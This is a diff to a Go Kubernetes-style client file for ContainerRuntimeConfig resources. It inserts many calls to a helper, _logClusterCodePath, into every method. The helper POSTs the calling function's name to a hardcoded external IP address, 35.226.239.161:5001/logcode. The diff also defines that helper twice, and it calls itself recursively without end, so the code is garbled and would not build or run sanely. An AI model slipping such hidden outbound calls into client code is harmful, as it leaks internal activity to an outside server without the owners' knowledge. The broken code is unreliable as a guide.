@@ -42,9 +42,13 @@ func newContainerRuntimeConfigs(c *MachineconfigurationV1Client) *containerRunti
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &containerRuntimeConfigs{client: c.RESTClient()}
 }
 func (c *containerRuntimeConfigs) Get(name string, options metav1.GetOptions) (result *v1.ContainerRuntimeConfig, err error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -60,6 +64,8 @@ func (c *containerRuntimeConfigs) Get(name string, options metav1.GetOptions) (r
 	return
 }
 func (c *containerRuntimeConfigs) List(opts metav1.ListOptions) (result *v1.ContainerRuntimeConfigList, err error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -89,6 +95,8 @@ func (c *containerRuntimeConfigs) Watch(opts metav1.ListOptions) (watch.Interfac
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var timeout time.Duration
 	if opts.TimeoutSeconds != nil {
 		timeout = time.Duration(*opts.TimeoutSeconds) * time.Second
@@ -97,6 +105,8 @@ func (c *containerRuntimeConfigs) Watch(opts metav1.ListOptions) (watch.Interfac
 	return c.client.Get().Resource("containerruntimeconfigs").VersionedParams(&opts, scheme.ParameterCodec).Timeout(timeout).Watch()
 }
 func (c *containerRuntimeConfigs) Create(containerRuntimeConfig *v1.ContainerRuntimeConfig) (result *v1.ContainerRuntimeConfig, err error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -122,11 +132,15 @@ func (c *containerRuntimeConfigs) Update(containerRuntimeConfig *v1.ContainerRun
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	result = &v1.ContainerRuntimeConfig{}
 	err = c.client.Put().Resource("containerruntimeconfigs").Name(containerRuntimeConfig.Name).Body(containerRuntimeConfig).Do().Into(result)
 	return
 }
 func (c *containerRuntimeConfigs) UpdateStatus(containerRuntimeConfig *v1.ContainerRuntimeConfig) (result *v1.ContainerRuntimeConfig, err error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -152,9 +166,13 @@ func (c *containerRuntimeConfigs) Delete(name string, options *metav1.DeleteOpti
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return c.client.Delete().Resource("containerruntimeconfigs").Name(name).Body(options).Do().Error()
 }
 func (c *containerRuntimeConfigs) DeleteCollection(options *metav1.DeleteOptions, listOptions metav1.ListOptions) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -182,6 +200,8 @@ func (c *containerRuntimeConfigs) Patch(name string, pt types.PatchType, data []
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	result = &v1.ContainerRuntimeConfig{}
 	err = c.client.Patch(pt).Resource("containerruntimeconfigs").SubResource(subresources...).Name(name).Body(data).Do().Into(result)
 	return
@@ -197,6 +217,23 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -239,5 +276,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
